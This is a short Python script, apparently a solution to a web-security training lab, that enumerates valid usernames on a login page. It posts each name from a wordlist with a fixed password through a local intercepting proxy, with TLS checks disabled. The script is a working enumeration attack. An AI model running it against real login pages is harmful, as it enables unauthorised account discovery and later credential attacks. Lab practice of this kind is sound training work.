import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def brute(s, url):
    uri = url + '/login'
    with open('Authentication/user.txt') as f:
        lines = f.readlines()
        for usr in lines:
            usernames = usr.strip()
            data = {'username': usernames, 'password': 'abc'}
            r = s.post(uri,data=data,allow_redirects=False,verify=False,proxies=proxies)
            sys.stdout.write('\r'+'Doing Something....!')
            sys.stdout.flush()
            if 'Invalid username or password.' not in r.text:
                print('\r' + usernames, 'is a valid username')
                break
            
                

def main():
    s = requests.Session()
    url = 'https://0a9600dc03a9043180fc2142002000c6.web-security-academy.net'
    brute(s,url)

if __name__=='__main__':
    main()